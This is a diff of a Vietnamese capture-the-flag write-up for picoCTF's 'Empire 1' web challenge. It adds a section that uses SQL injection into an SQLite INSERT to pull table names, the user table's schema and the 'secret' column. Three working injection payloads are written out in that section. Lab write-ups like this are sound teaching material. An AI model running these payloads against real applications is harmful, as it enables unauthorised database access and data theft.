@@ -1,12 +1,12 @@
 #### Empire 1 ([Link](https://2019shell1.picoctf.com/problem/49726/))
 
--  Nói ra thì đây là 1 bài khá khó chịu. Mình muốn giải bài này theo 2 cách
+- Nói ra thì đây là 1 bài khá khó chịu. Mình muốn giải bài này theo 2 cách
 
 - Cách 1 thì là cách mình làm lấy flag trong thời gian giải còn hiện hành. Nói ra thì cách này khá là hãm, không đi theo đúng hướng đề đưa ra. *View source* lên thấy cái *csrf_token* thì là thấy nguời ra đề không muốn ta dùng tool nào để giải. Bắt buộc phải *dump* tay ra flag luôn. Tuy nhiên mình không tìm ra được kỹ thuật *dump* tay để ra flag luôn. Đành phải vượt qua *csrf_token* và dùng kỹ thuật *blind sql* để giải bài này. Tuy hãm nhưng ra được flag là ok rồi
 
-- Cách 2 là cách dễ hơn khi đi tham khảo vài tiền bối trong clb. Cái này thuộc dạng *insert*, chỉ cần *select* để *dump* data ra là được. Nói sơ qua thì ta cần *insert* 1 biến vào trong *database*, rồi nó trả về kết quả ở chỗ khác. Giờ ta cần nối được chuỗi giá trị ta nhập vô với chuỗi đã *insert* trước đó để ra flag
+- Cách 2 là cách dễ hơn rất nhiều so với cách, nhưng trong lúc thi mình không sử dụng nó, nói trắng ra là không biết sử dụng :v
 
-- Cách 2 này thì thời điểm này mình chưa viết wu, do chưa hiểu kỹ loại *insert* này. Tạm thời tại thời điểm này mình chỉ trình bày cách 1
+- Cách 2 mình sẽ trình bày ở sau cùng
 
 - OK, cách nào thì cũng là cách, ra flag là được. Bắt đầu chiến thôi
 
@@ -97,3 +97,44 @@
 - Mạn phép không giải thích cái tool, có thể vừa xem vừa *research* để xem cách mình đã dùng để viết nên tool này
 
 - OK, sau 1 hồi xài cái cách vãi chưởng này thì cũng ra được flag. Mạn phép không show, các bạn nên tự làm dựa theo hướng dẫn của mình. Thực ra mình lười chạy lại để lấy flag, với nó cũng khá là lâu :v
+
+
+#  Cách 2 ( cách này rất nhanh nhưng trong lúc giải bài mình không làm cách này :v)
+
+- Sau 1 hồi *fuzzing* thì mình biết đây là *sqlite*. Cho nên mình sẽ trích xuất data từ *sqlite_master*
+
+- Về chi tiết thì mình sẽ trình bày trong phần *Allpayload* ở trên github của mình
+
+- OK, giờ ta dump ra tên của *table*
+
+  - Payload:
+
+    ```mysql
+    ' || (SELECT tbl_name FROM sqlite_master WHERE type='table') || '
+    ```
+
+    ![1](images/Selection_001.png)
+
+- Tiếp theo mình sẽ *dump* ra câu *sql* để hình thành ra *table user* để tìm các *columns*
+
+  - Payload:
+
+    ```mysql
+    ' || (SELECT sql FROM sqlite_master WHERE type='table' and tbl_name='user') || '
+    ```
+
+    ![2](images/Selection_002.png)
+
+- OK, giờ ta để ý nhân vật chính là *username* và *secret*. Dựa theo hint của đề thì ta có thể thấy *flag* ở phần *secret* và *username* chính là tên ta đăng nhâp
+
+- Bây giờ ta chỉ cần *dump data* của *secret* là xong
+
+  - Payload:
+
+    ```mysql
+    ' || (SELECT secret FROM user WHERE username = 'kaito') || '
+    ```
+
+    ![3](images/Selection_003.png)
+
+- Done, rất đơn giản đúng không. Đơn giản hơn rất nhiều so với cách mình trình bày phía trước. Vì vậy mình mới xây dựng *Allpayload* để tổng hợp tất cả lại, tránh những trường hợp ngu người như vầy nữa :v
